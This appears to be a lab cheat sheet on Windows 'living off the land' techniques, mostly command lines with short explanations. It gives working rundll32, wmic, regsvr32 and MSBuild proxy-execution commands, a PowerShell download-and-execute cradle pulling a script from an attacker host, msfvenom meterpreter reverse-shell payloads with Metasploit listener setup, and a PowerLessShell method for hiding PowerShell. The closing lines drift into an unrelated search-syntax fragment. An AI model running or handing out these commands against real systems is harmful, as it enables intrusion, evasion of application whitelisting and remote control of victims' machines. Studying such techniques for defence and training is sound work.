File Execution/Arbitrary code execution:
  explorer.exe /root,"C:\Windows\System32\calc.exe"
                                Create a child process of `explorer.exe` parent (calculator)
                                This technique is called Signed Binary Proxy Execution or Indirect Command
                                Execution, where the attacker leverages other system tools to spawn malicious payloads.
                                File Explorer can execute other .exe files. This technique is called Indirect 
                                Command Execution, where the explorer.exe tool can be used and abused to
                                launch malicious scripts or executables from a trusted parent process
  wmic.exe process call create calc
                                WMIC command creates a new process of a binary of our choice, `calc.exe`
                                Windows Management Instrumentation (WMIC) is used to execute binaries for
                                evading defensive measures. The MITRE ATT&CK framework refers to this 
                                technique as Signed Binary Proxy Execution (T1218)
  rundll32.exe javascript:"\..\mshtml.dll,RunHTMLApplication ";eval("w=new ActiveXObject(\"WScript.Shell\");w.run(\"calc\");window.close()");
                                Execute a calc.exe binary (embeds a JavaScript component, `eval()`, to execute the `calc.exe` binary)
                                rundll32.exe can run arbitrary payloads and execute JavaScript and PowerShell scripts.
                                The MITRE ATT&CK framework identifies this as Signed Binary Proxy Execution:
                                `Rundll32` and refers to it as T1218
  rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://AttackBox_IP/script.ps1');");
                                Execute PowerShell scripts using the `rundll32.exe`. The following command runs a JavaScript that executes
                                a PowerShell script to download from a remote website using `rundll32.exe`. As a result, a copy of the `script.ps1`
                                downloaded into memory on the target machine

Application Whitelisting Bypasses:
  msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 -f dll -a x86 > live0fftheland.dll
                                Create a malicious DLL file using `msvenom` and set up our  Metasploit listener to receive a reverse shell
                                Note that we will be creating a malicious file that works for 32bit operating systems. We will be using the `regsvr32.exe`
                                Application Whitelisting Bypass technique to run a command on a target system.
                                We specified the output type as `DLL` using the `-f` argument
msfconsole -q
  use exploit/multi/handler
  set payload windows/meterpreter/reverse_tcp
  set LHOST ATTACKBOX_IP
  set LPORT 443
  exploit
python3 -m http.server 1337     Once the malicious `DLL` file is generated, we need to deliver the payload to the victim machine. 
                                We will do this by using a webserver to serve the `DLL` file on our attacking machine
                                From the victim machine, visit the webserver of the attacking machine on port `1337` that we specify.
c:\Windows\System32\regsvr32.exe c:\Users\thm\Downloads\live0fftheland.dll
or
c:\Windows\System32\regsvr32.exe /s /n /u /i:http://example.com/file.sct Downloads\live0fftheland.dll
                                Once the file `DLL` file is downloaded, we execute it using `regsvr32.exe`. We should receive a reverse shell.
                                Note if we wanted to create a 64-bit `DLL` version, we need to specify it in the `msfvenom` command and
                                run it from the victim machine using the `64bits` version of `regsvr32.exe` at `C:\Windows\SysWOW64\regsvr32.exe`.

Regsvr32 Options (second option):
 	/s   Silent mode (without showing messages)
 	/n   Not call the DLL register server
 	/i:: Use another server since we used /n
 	/u   Run with unregister method

Other techniques:
msfvenom -p windows/meterpreter/reverse_winhttps LHOST=AttackBox_IP LPORT=4443 -f psh-reflection > liv0ff.ps1
                                PowerLessShell is a Python-based tool that generates malicious code to run on a target machine
                                without showing an instance of the PowerShell process.
                                One of the project requirements is to get a PowerShell payload to make it suitable to work
                                with MSBuild. We need to generate a PowerShell payload using msfvenom
msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_winhttps; set lhost AttackBox_IP;set lport 4443;exploit"
                                We need to run the Metasploit framework to listen and wait for the reverse shell
mv liv0ff.ps1 /tmp              Change to the PowerLessShell directory project to convert the payload to be compatible with the MSBuild tool.
PowerLessShell -type powershell -source /tmp/liv0ff.ps1 -output liv0ff.csproj
                                Run the PowerLessShell tool and set the source file to the one we created with msfvenom
                                Once the command is executed successfully, we need to transfer the output file to the Windows machine.
                                You can do this using the `SCP` command or set a web server to host the file on the AttackBox (`python3 -m http.server 1337`)
                                and download the file using the browser.
c:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe c:\Users\thm\Downloads\liv0ff.csproj
                                On the target Windows machine, build the `.csproj` file and wait for the reverse shell
                                Once we run the MSBuild command, wait a couple of seconds till we receive a reverse shell
                                Note that there will be no `powershell.exe` process is running

It is straightforward to look for a binary; including the binary name will show the result. 
To look for a specific function, we require providing a `/` before the function name. For instance, to look for 
all execute functions, we should use `/execute`. 
In order to look based on types, we should use the `#` symbol followed by the type name.
The following are the types included in the project:
